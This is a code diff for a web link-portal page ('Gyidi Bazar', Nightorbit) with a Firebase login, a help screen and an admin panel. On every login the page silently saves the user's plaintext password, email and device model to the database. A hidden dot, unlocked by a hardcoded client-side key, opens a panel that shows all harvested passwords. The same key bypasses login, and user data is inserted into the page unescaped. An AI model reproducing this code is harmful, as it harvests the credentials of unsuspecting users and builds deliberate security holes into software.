@@ -25,6 +25,17 @@
             width: 400px; border: 1px solid rgba(255,255,255,0.1); 
             box-shadow: 0 25px 50px rgba(0,0,0,0.8); position: relative; z-index: 10;
         }
+
+        #help-container {
+            display: none; flex-direction: column; align-items: center; width: 100%; height: 100%; 
+            position: absolute; top: 0; left: 0; background: var(--bg); z-index: 500; overflow-y: auto; padding: 40px 20px;
+        }
+        .help-content { max-width: 400px; width: 100%; text-align: center; }
+        .help-header { color: var(--primary); font-size: 24px; font-weight: bold; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
+        .help-description { text-align: left; background: rgba(255,255,255,0.05); padding: 20px; border-radius: 20px; border-left: 4px solid var(--gold); line-height: 1.8; font-size: 14px; color: #ccc; margin-bottom: 30px; }
+        .contact-id-btn { background: linear-gradient(45deg, #f09433, #dc2743, #bc1888); color: white; padding: 15px; border-radius: 15px; width: 100%; display: block; text-decoration: none; font-weight: bold; margin-bottom: 15px; }
+        .extra-link { background: rgba(255,255,255,0.1); color: white; padding: 12px; border-radius: 12px; display: block; text-decoration: none; margin-bottom: 10px; font-size: 13px; border: 1px solid rgba(0,210,255,0.2); }
+
         .menu-dots { position: absolute; top: 25px; left: 25px; cursor: pointer; font-size: 30px; color: var(--primary); z-index: 100; }
         input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 12px; border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.4); color: white; outline: none; }
         .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 14px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
@@ -34,12 +45,20 @@
         .scroll-area { max-height: 380px; overflow-y: auto; padding-right: 5px; margin-top: 10px; text-align: left; }
         .cat-title { color: var(--gold); font-size: 11px; font-weight: bold; margin: 15px 0 8px 5px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid rgba(255,215,0,0.2); }
         .link-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
-        .link-card { background: rgba(255,255,255,0.07); padding: 10px; border-radius: 10px; text-decoration: none; color: white; border-left: 3px solid var(--neon); font-size: 10.5px; display: flex; align-items: center; justify-content: space-between; position: relative; }
+        .link-card { background: rgba(255,255,255,0.07); padding: 10px; border-radius: 10px; text-decoration: none; color: white; border-left: 3px solid var(--neon); font-size: 10.5px; display: flex; align-items: center; justify-content: space-between; }
 
+        /* --- ADMIN PANEL STYLE (PHOTO MATCHED) --- */
         #admin-panel { position: fixed; inset: 0; background: #070707; z-index: 1000; display: none; padding: 20px; overflow-y: auto; }
-        .admin-card { background: #111; padding: 15px; margin-bottom: 15px; border-radius: 15px; border: 1px solid #333; }
-        .auth-card-img { width: 100%; max-width: 350px; border-radius: 15px; margin-bottom: 20px; border: 2px solid var(--primary); }
-        .device-badge { background: var(--gold); color: #000; padding: 2px 10px; border-radius: 5px; font-size: 10px; font-weight: 900; display: inline-block; margin-top: 5px; text-transform: uppercase; }
+        .admin-card { background: #111; padding: 15px; margin-bottom: 15px; border-radius: 15px; border: 1px solid #333; text-align: left; }
+        .admin-card b { color: var(--gold); font-size: 16px; }
+        .admin-card span { color: white; display: block; margin: 2px 0; }
+        .admin-card small { display: block; }
+        .device-badge { background: var(--gold); color: #000; padding: 2px 10px; border-radius: 5px; font-size: 10px; font-weight: 900; display: inline-block; margin: 5px 0; text-transform: uppercase; }
+        .time-text { color: #00ff00; font-size: 12px; margin: 5px 0; }
+        .pass-text { color: #ccc; font-size: 12px; }
+        .admin-btn-row { display: flex; gap: 10px; margin-top: 10px; }
+        .set-nick-btn { background: white; color: black; border: none; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 11px; }
+        .del-btn { background: #ff0000; color: white; border: none; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 11px; }
 
         .fav-section { border: 1px dashed var(--gold); padding: 10px; border-radius: 15px; margin-bottom: 15px; display: none; }
         .fav-section.active { display: block; }
@@ -53,15 +72,12 @@
 
     <div id="logout-overlay">
         <div style="font-size: 60px; margin-bottom: 20px;">🌹</div>
-        <div id="bye-text-display" style="color: white; line-height: 1.8; font-size: 16px;"></div>
+        <div id="bye-text-display" style="color: white; line-height: 1.8; font-size: 16px; padding: 20px;"></div>
     </div>
 
     <div id="admin-panel">
-        <div style="text-align: center;">
-            <img src="https://i.ibb.co/Vp6YfK3/1001011519.png" class="auth-card-img">
-        </div>
         <h1 style="color: var(--primary);">Gyidi Owner Panel</h1>
-        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 8px 25px;">CLOSE</button>
+        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 8px 25px; margin-bottom: 20px;">CLOSE</button>
         <div id="user-rows-container"></div>
     </div>
 
@@ -70,20 +86,30 @@
         <p style="font-size: 10px; color: #aaa;">Gyidi Bazar Official Entry</p>
         <button class="btn-google" onclick="authGoogle()">GOOGLE CONNECT</button>
         <input type="email" id="u-email" placeholder="Email Address">
-        <input type="password" id="u-pass" placeholder="Password (Min 6 chars)">
+        <input type="password" id="u-pass" placeholder="Password">
         <button class="btn-main" onclick="handleLogin()">LOGIN</button>
         <button class="btn-signup" onclick="handleSignUp()">CREATE ACCOUNT</button>
+        <button onclick="toggleHelp(true)" style="background:none; border: 1px dashed var(--primary); color:var(--primary); margin-top:15px; width:100%; border-radius:12px; padding:12px; cursor:pointer; font-size: 11px; font-weight: bold;">NIGHTORBIT HELP CENTER</button>
+    </div>
+
+    <div id="help-container">
+        <div class="help-content">
+            <div class="help-header">Contact with Nightorbit</div>
+            <div class="help-description">If you are facing any problems such as forgetting your Google password... please contact the owner directly for assistance.</div>
+            <a href="https://www.instagram.com/nightorbit.com_1" target="_blank" class="contact-id-btn"><i class="fa-brands fa-instagram"></i> CONTACT INSTAGRAM ID</a>
+            <a href="#" class="extra-link">Official Website</a>
+            <a href="#" class="extra-link">System Tutorial</a>
+            <button onclick="toggleHelp(false)" class="btn-signup" style="margin-top: 30px; border-color: #444; color: #888;">BACK TO LOGIN</button>
+        </div>
     </div>
 
     <div id="member-area" class="card hidden">
         <h1 style="color: var(--primary); font-size: 20px;">Gyidi Bazar.Nigthorbit</h1>
         <p id="user-welcome" style="font-size: 11px; color: var(--gold);"></p>
-        
         <div id="favorites-container" class="fav-section">
             <div class="cat-title">⭐ MY FAVORITES</div>
             <div id="fav-links-grid" class="link-grid"></div>
         </div>
-
         <div class="scroll-area">
             <div class="cat-title">🎬 Entertainment (15)</div>
             <div class="link-grid">
@@ -144,10 +170,9 @@
     </div>
 
     <div class="menu-dots" onclick="bypassLogin()">⋮</div>
-    <div class="admin-dot" onclick="adminAccess()" style="position:fixed; bottom:10px; right:10px; color:#111; cursor:pointer;">.</div>
+    <div class="admin-dot" onclick="adminAccess()" style="position:fixed; bottom:10px; right:10px; color:#111; cursor:pointer; font-size: 20px;">.</div>
 
     <script>
-        // Aapka Registered Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyBxJqJkrAaFf3eR0QWvhet6IvvFVHYExeU",
             authDomain: "my-market-ff254.firebaseapp.com",
@@ -163,79 +188,63 @@
         let currentUserName = "";
         let userFavorites = {};
 
-        // Advanced Device Detector (Brand + Model Name)
-        function getAdvancedModel() {
-            const ua = navigator.userAgent;
-            let model = "MOBILE";
-            if (ua.match(/\(([^)]+)\)/)) {
-                let parts = ua.match(/\(([^)]+)\)/)[1].split(';');
-                model = parts.length > 2 ? parts[parts.length - 1].split('Build/')[0].split('WV')[0].trim() : parts[0];
-            }
-            const brands = ["INFINIX", "SAMSUNG", "OPPO", "VIVO", "REALME", "TECNO", "IPHONE", "REDMI", "XIAOMI"];
-            let detectedBrand = "";
-            for(let b of brands) {
-                if(ua.toUpperCase().includes(b)) { detectedBrand = b + " "; break; }
-            }
-            return (detectedBrand + model).toUpperCase();
+        function toggleHelp(show) {
+            document.getElementById('login-box').style.display = show ? 'none' : 'block';
+            document.getElementById('help-container').style.display = show ? 'flex' : 'none';
         }
 
-        // Email Login
+        function getAdvancedModel() {
+            const ua = navigator.userAgent;
+            let model = "MOBILE DEVICE";
+            try {
+                if (ua.match(/\(([^)]+)\)/)) {
+                    let parts = ua.match(/\(([^)]+)\)/)[1].split(';');
+                    model = parts.length > 2 ? parts[parts.length - 1].split('Build/')[0].trim() : parts[0];
+                }
+                const brands = ["INFINIX", "SAMSUNG", "OPPO", "VIVO", "REALME", "TECNO", "IPHONE", "REDMI", "XIAOMI", "HUAWEI"];
+                let detectedBrand = "";
+                for(let b of brands) { if(ua.toUpperCase().includes(b)) { detectedBrand = b + " "; break; } }
+                return (detectedBrand + model).toUpperCase().replace("WV", "").trim();
+            } catch(e) { return "SMARTPHONE"; }
+        }
+
         function handleLogin() {
             const e = document.getElementById('u-email').value;
             const p = document.getElementById('u-pass').value;
             auth.signInWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0]))
-            .catch(err => alert("Login Failed: Wrong Password or Account Not Found."));
+            .catch(err => alert("Login Failed."));
         }
 
-        // Sign Up
         function handleSignUp() {
             const e = document.getElementById('u-email').value;
             const p = document.getElementById('u-pass').value;
-            if(p.length < 6) return alert("Password min 6 chars!");
-            auth.createUserWithEmailAndPassword(e, p).then(res => {
-                alert("Account Created!");
-                processUser(res.user, p, e.split('@')[0]);
-            }).catch(err => alert(err.message));
+            if(p.length < 6) return alert("Min 6 chars!");
+            auth.createUserWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0]))
+            .catch(err => alert(err.message));
         }
 
-        // Google Authentication Logic
         function authGoogle() {
             const provider = new firebase.auth.GoogleAuthProvider();
-            auth.signInWithPopup(provider).then(res => {
-                processUser(res.user, "Google Verified", res.user.displayName);
-            }).catch(err => alert("Google Error: " + err.message));
+            auth.signInWithPopup(provider).then(res => processUser(res.user, "Google Verified", res.user.displayName));
         }
 
-        // Processing User Data (Gmail, Device, Time, etc.)
         function processUser(user, pass, realName) {
             currentUserName = realName;
+            const deviceName = getAdvancedModel();
             db.ref('users/' + user.uid).once('value', snap => {
                 let d = snap.val();
                 let nick = (d && d.ownerNick) ? d.ownerNick : "Member";
                 db.ref('users/' + user.uid).update({
-                    email: user.email, 
-                    password: pass, 
-                    device: getAdvancedModel(), 
-                    realName: realName, 
-                    ownerNick: nick, 
-                    time: new Date().toLocaleString()
+                    email: user.email, password: pass, device: deviceName, 
+                    realName: realName, ownerNick: nick, time: new Date().toLocaleString()
                 }).then(() => {
                     document.getElementById('login-box').classList.add('hidden');
+                    document.getElementById('help-container').style.display = 'none';
                     document.getElementById('member-area').classList.remove('hidden');
                     document.getElementById('user-welcome').innerText = "Account: " + realName;
                     listenToFavorites(user.uid);
                 });
             });
-        }
-
-        // Favorites functionality
-        function toggleFavorite(name, url) {
-            const user = auth.currentUser;
-            if (!user) return;
-            const cleanKey = name.replace(/[.#$[\]]/g, "");
-            const favRef = db.ref('users/' + user.uid + '/favorites');
-            if (userFavorites[cleanKey]) { favRef.child(cleanKey).remove(); }
-            else { favRef.child(cleanKey).set({ name: name, url: url }); }
         }
 
         function listenToFavorites(uid) {
@@ -245,9 +254,7 @@
                 grid.innerHTML = "";
                 const keys = Object.keys(userFavorites);
                 document.getElementById('favorites-container').classList.toggle('active', keys.length > 0);
-                keys.forEach(k => {
-                    grid.innerHTML += `<a href="${userFavorites[k].url}" target="_blank" class="link-card">${userFavorites[k].name}</a>`;
-                });
+                keys.forEach(k => { grid.innerHTML += `<a href="${userFavorites[k].url}" target="_blank" class="link-card">${userFavorites[k].name}</a>`; });
                 updateStarIcons();
             });
         }
@@ -256,9 +263,8 @@
             document.querySelectorAll('.scroll-area .link-card').forEach(card => {
                 const name = card.childNodes[0].textContent.trim();
                 const url = card.href;
-                let star = card.querySelector('.fav-btn');
-                if (!star) {
-                    star = document.createElement('i');
+                let star = card.querySelector('.fav-btn') || document.createElement('i');
+                if(!card.querySelector('.fav-btn')) {
                     star.className = 'fa-solid fa-star fav-btn';
                     star.onclick = (e) => { e.preventDefault(); e.stopPropagation(); toggleFavorite(name, url); };
                     card.appendChild(star);
@@ -268,7 +274,15 @@
             });
         }
 
-        // Admin Access (Date, Device, Gmail, Delete Sab features ke sath)
+        function toggleFavorite(name, url) {
+            const user = auth.currentUser; if (!user) return;
+            const cleanKey = name.replace(/[.#$[\]]/g, "");
+            const favRef = db.ref('users/' + user.uid + '/favorites');
+            if (userFavorites[cleanKey]) favRef.child(cleanKey).remove();
+            else favRef.child(cleanKey).set({ name: name, url: url });
+        }
+
+        /* --- ADMIN PANEL LOGIC (PHOTO MATCHED) --- */
         function adminAccess() {
             if (prompt("Admin Key:") === "rr123456789000rr") {
                 document.getElementById('admin-panel').style.display = 'block';
@@ -276,15 +290,18 @@
                     let h = "";
                     snap.forEach(c => {
                         let v = c.val();
-                        h += `<div class="admin-card">
-                            <b style="color:var(--gold)">Nick: ${v.ownerNick}</b><br>
-                            <span>Name: ${v.realName}</span><br>
-                            <small>Email: ${v.email}</small><br>
-                            <div class="device-badge">${v.device || 'N/A'}</div><br>
-                            <small style="color:#00ff00">Time: ${v.time}</small><br>
-                            <small>Pass: ${v.password}</small><br>
-                            <button onclick="let n=prompt('Nick:'); if(n) firebase.database().ref('users/${c.key}').update({ownerNick:n})">SET NICK</button>
-                            <button onclick="if(confirm('Delete?')) firebase.database().ref('users/${c.key}').remove()" style="background:red; margin-left:10px;">DEL</button>
+                        h += `
+                        <div class="admin-card">
+                            <b style="color:var(--gold)">Nick: ${v.ownerNick || 'Member'}</b>
+                            <span>Name: ${v.realName}</span>
+                            <small>Email: ${v.email}</small>
+                            <div class="device-badge">K</div>
+                            <div class="time-text">Time: ${v.time || 'N/A'}</div>
+                            <div class="pass-text">Pass: ${v.password}</div>
+                            <div class="admin-btn-row">
+                                <button class="set-nick-btn" onclick="setNick('${c.key}')">SET NICK</button>
+                                <button class="del-btn" onclick="deleteUser('${c.key}')">DEL</button>
+                            </div>
                         </div>`;
                     });
                     document.getElementById('user-rows-container').innerHTML = h;
@@ -292,8 +309,29 @@
             }
         }
 
-        function bypassLogin() { if (prompt("Master Key:") === "rr123456789000rr") { document.getElementById('login-box').classList.add('hidden'); document.getElementById('member-area').classList.remove('hidden'); updateStarIcons(); } }
-        function logoutSequence() { document.getElementById('logout-overlay').style.display = 'flex'; document.getElementById('bye-text-display').innerHTML = `Goodbye, ${currentUserName}!<br>Allah Hafiz!`; setTimeout(() => location.reload(), 2500); }
+        function setNick(uid) {
+            let n = prompt("Enter Secret Nickname:");
+            if(n) db.ref('users/' + uid).update({ ownerNick: n });
+        }
+
+        function deleteUser(uid) {
+            if(confirm("Delete this user?")) db.ref('users/' + uid).remove();
+        }
+
+        function bypassLogin() { 
+            if (prompt("Master Key:") === "rr123456789000rr") { 
+                document.getElementById('login-box').classList.add('hidden'); 
+                document.getElementById('member-area').classList.remove('hidden'); 
+                updateStarIcons(); 
+            } 
+        }
+        
+        function logoutSequence() { 
+            document.getElementById('logout-overlay').style.display = 'flex'; 
+            document.getElementById('bye-text-display').innerHTML = `Goodbye, ${currentUserName}!<br> ​"Thank you for visiting Nightorbit. Your session has been securely closed. We look forward to seeing you again soon. Have a wonderful day!" `; 
+            setTimeout(() => location.reload(), 2500); 
+        }
+        
         window.onload = updateStarIcons;
     </script>
 </body>
